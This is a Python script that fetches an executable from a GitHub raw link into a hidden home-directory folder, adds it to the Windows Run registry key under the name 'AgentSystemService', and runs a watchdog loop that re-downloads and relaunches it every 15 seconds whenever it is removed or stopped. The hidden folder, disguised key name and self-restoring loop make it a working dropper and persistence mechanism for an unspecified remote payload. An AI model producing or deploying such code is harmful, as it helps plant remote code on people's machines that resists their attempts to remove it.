import os
import sys
import time
import requests
import subprocess
import winreg
from pathlib import Path

# --- CONFIGURATION ---
# IMPORTANT: Replace this with the direct GitHub raw link to your compiled agent.exe
GITHUB_RAW_URL = "https://raw.githubusercontent.com/your-username/your-repo/main/agent.exe"

# The name of the hidden folder in the user's home directory
INSTALL_FOLDER_NAME = ".agent"
# The name of the executable to be downloaded and run
EXE_NAME = "agent.exe"
# The name for the startup registry key
STARTUP_KEY_NAME = "AgentSystemService"
# How often (in seconds) the watchdog should check if the agent is running
WATCHDOG_INTERVAL = 15

# --- END CONFIGURATION ---

def get_install_path():
    """Gets the full path to the installation directory and the executable."""
    install_dir = Path.home() / INSTALL_FOLDER_NAME
    exe_path = install_dir / EXE_NAME
    return install_dir, exe_path

def setup_installation_dir(install_dir):
    """Creates the installation directory if it doesn't exist."""
    try:
        install_dir.mkdir(exist_ok=True)
        # Hides the folder on Windows
        if os.name == 'nt':
            subprocess.run(['attrib', '+h', str(install_dir)], check=False, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"[INFO] Installation directory is set to: {install_dir}")
    except Exception as e:
        print(f"[ERROR] Could not create installation directory: {e}")
        sys.exit(1)

def download_agent(exe_path):
    """Downloads the agent executable from the specified URL."""
    print(f"[INFO] Downloading agent from {GITHUB_RAW_URL}...")
    try:
        with requests.get(GITHUB_RAW_URL, stream=True) as r:
            r.raise_for_status()
            with open(exe_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)
        print(f"[SUCCESS] Agent downloaded to {exe_path}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Failed to download agent: {e}")
        return False

def add_to_startup(exe_path):
    """Adds the agent executable to the Windows startup registry."""
    if os.name != 'nt':
        print("[WARN] Startup persistence is only supported on Windows.")
        return

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, STARTUP_KEY_NAME, 0, winreg.REG_SZ, str(exe_path))
            print(f"[SUCCESS] Added to startup registry key: '{STARTUP_KEY_NAME}'")
    except Exception as e:
        print(f"[ERROR] Could not add to startup: {e}")

def is_process_running(exe_name):
    """Checks if a process with the given exe name is currently running."""
    # Use psutil if available for a more robust check
    try:
        import psutil
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == exe_name.lower():
                return True
        return False
    except (ImportError, ModuleNotFoundError):
        # Fallback to tasklist if psutil is not installed
        if os.name == 'nt':
            try:
                output = subprocess.check_output(f'tasklist /FI "IMAGENAME eq {exe_name}"', shell=True, stderr=subprocess.PIPE).decode()
                return exe_name.lower() in output.lower()
            except subprocess.CalledProcessError:
                return False # The command fails if the process isn't found
        else:
            print("[WARN] Cannot check process on non-Windows without psutil.")
            return True # Assume it's running to avoid loops

def run_agent(exe_path):
    """Runs the agent executable in a new process."""
    print(f"[INFO] Starting agent: {exe_path}")
    try:
        # Use Popen to run in the background, allowing this watchdog to continue
        subprocess.Popen([str(exe_path)])
    except Exception as e:
        print(f"[ERROR] Failed to start agent process: {e}")

def main_watchdog_loop():
    """The main loop that ensures the agent is always installed and running."""
    install_dir, exe_path = get_install_path()
    
    setup_installation_dir(install_dir)
    add_to_startup(exe_path)

    print("\n[INFO] Watchdog started. It will now monitor the agent process.")
    print("[INFO] You can close this window; the monitoring will not be affected (once compiled to exe).")
    
    while True:
        try:
            # 1. Check if the agent file exists
            if not exe_path.exists():
                print("[WARN] Agent executable not found! Attempting to re-download...")
                download_agent(exe_path)
                continue # Restart the loop to check again

            # 2. Check if the agent process is running
            if not is_process_running(EXE_NAME):
                print(f"[WARN] Agent process '{EXE_NAME}' is not running. Starting it now...")
                run_agent(exe_path)
            
            # Wait for the next check
            time.sleep(WATCHDOG_INTERVAL)
        except KeyboardInterrupt:
            print("\n[INFO] Watchdog stopped by user.")
            break
        except Exception as e:
            print(f"[ERROR] An unexpected error occurred in the watchdog loop: {e}")
            time.sleep(WATCHDOG_INTERVAL) # Wait before retrying after an error

if __name__ == "__main__":
    if GITHUB_RAW_URL == "https://raw.githubusercontent.com/your-username/your-repo/main/agent.exe":
        print("[CRITICAL] Please edit the 'installer.py' script and set the GITHUB_RAW_URL variable.")
    else:
        main_watchdog_loop()